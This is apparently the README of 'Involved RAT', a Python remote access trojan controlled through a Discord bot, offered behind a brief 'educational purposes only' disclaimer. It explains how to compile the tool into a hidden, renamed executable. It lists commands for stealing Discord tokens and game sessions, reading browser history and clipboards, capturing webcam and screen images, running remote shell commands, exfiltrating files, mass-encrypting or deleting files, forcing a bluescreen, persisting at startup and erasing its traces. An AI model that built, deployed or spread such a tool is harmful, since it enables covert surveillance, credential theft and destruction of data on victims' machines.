# Involved RAT

Python RAT That Uses Discord For Control.

# Disclaimer

**This Tool Was Made For Educational Purposes Only, The Author Will Not Be Held Responsible For Any Misuse Of This Tool.**

# Help

Create A Discord Bot With Administrator Permissions, Invite It To Your Server.
Change The Token Variable In Involved.py To Your Bot's Token
Install The Requirements
```
py -m pip install -r requirements.txt
```
Now Compile To Exe:
```
py -m pyinstaller --onefile --noconsole Involved.py
```
Now Rename The File To A Custom Name.

# Commands

```
>>> .exit | Exits The Program On The  User's PC. 
>>> .startup | Adds Program To Startup On The  User's PC. 
>>> .screenshot <int: Monitor Number> | Takes A Screenshot Of The  User's Monitor. 
>>> .readclipboard | Reads The  User's Clipboard. 
>>> .setclipboard <str: Text> | Sets The  User's Clipboard To The Text Provided. 
>>> .clearclipboard | Clears The  User's Clipboard. 
>>> .ipinfo | Gets Information About The  User's IP Address. 
>>> .systeminfo | Gets Information About The  User's System. 
>>> .browserhistory | Gets The  User's Browser History. 
>>> .type <str: Text> | Types The Provided Text On The  User's PC. 
>>> .say <str: Text> | Speaks The Text Provided Outloud On The  User's PC. 
>>> .setvolume <int: 0-1> | Sets The  User's Volume To The Provided Value. 
>>> .increasevolume <int: 0-1> | Increases The  User's Volume By The Provided Value. 
>>> .decreasevolume <int: 0-1> | Decreases The  User's Volume By The Provided Value. 
>>> .mute | Mutes The  User's PC. 
>>> .unmute | Unmutes The  User's PC. 
>>> .messagebox <str: Title, str: Text> | Shows A Message Box On The  User's PC With The Provided Values. 
>>> .exitprogram <str: Process Name> | Exits A Process From The Provided Process Name. 
>>> .openprogram <str: Path> | Opens A Program From The Provided Path. 
>>> .blockinput <ADMIN> | Blocks Input On The  User's PC. 
>>> .unblockinput <ADMIN> | Unblocks Input On The  User's PC. 
>>> .discordtokens | Grabs All Discord Tokens On The  User's PC. 
>>> .minecraftprofiles | Grabs All Minecraft Launcher Sessions On The  User's PC. 
>>> .uploadfile <str: File Name> <Attachment> | Uploads A File Onto The  User's PC From An Attachment. 
>>> .deletefile <str: Path> | Deletes A File On The  User's PC From The Provided Path. 
>>> .startactivitylogger | Says The Current Window That The Victim Is Viewing.
>>> .stopactivitylogger | Stops Saying The Current Window That The Victim Is Viewing. 
>>> .changewallpaper <Attachment> | Changes The  User's Wallpaper To The Given Attachment. 
>>> .shell <str: Command> | Executes A Shell Command On The  User's PC And Returns The Output. 
>>> .cd <str: Path> | Changes Directory To The Provided Path. 
>>> .download <str: Path> | Downloads A File From The  User's PC 
>>> .press <str: Key> | Presses A Key On The  User's PC, .press help To View Keys. 
>>> .movemouse <int: X> <int: Y> | Moves Mouse To Given Position. 
>>> .click <str: Button (left, middle, right)> <int: Clicks> | Clicks The Provided Button As Many Times As Provided. 
>>> .clickwithposition <str: Button (left, middle, right)> <int: Clicks> <int: X> <int: Y> | Clicks Mouse <Clicks> Times At Given Position. 
>>> .scroll <int: Amount> | Scrolls <Amount> Times. 
>>> .scrollwithpostion <int: Amount> <int: X> <int: Y> | Scrolls <Amount> Times At The Given Position. 
>>> .webcamimage | Takes An Image Of The  User's Webcam. 
>>> .mkdir <aliases: makedir, makedirectory> <str: Name> | Makes A New Directory. 
>>> .currentdirectory <aliases: getcwd, cwd, currentdir> | Returns The Current Directory. 
>>> .massdeletefiles <float: Delay> <str: Path> | Deletes All Files In The Given Directory. 
>>> .encryptfile <aliases: encrypt> <str: Path> | Encrypts Given File (DON'T LOSE KEY OTHERWISE YOU WILL NOT BE ABLE TO DECRYPT). 
>>> .decryptfile <aliases: decrypt> <str: Key> <str: Path> | Decrypts Given File. 
>>> .bluescreen <aliases: bsod, bs> | Bluescreens The  User's PC. 
>>> .shutdown | Shuts Down The  User's PC. 
>>> .restart | Restarts The  User's PC. 
>>> .logoff | Log The Victim Off Of The PC. 
>>> .massencryptfiles <aliases: massencrypt, mef> <str: Path> | Encrypts All Files In Given Directory (DON'T LOSE KEY OTHERWISE YOU WILL NOT BE ABLE TO DECRYPT). 
>>> .massdecryptfiles <aliases: massdecrypt, mdf> <str: Key> <str: Path> | Decrypts All Files In Given Directory. 
>>> .selfdestruct | Removes All Traces Of RAT On  User's PC. 
```
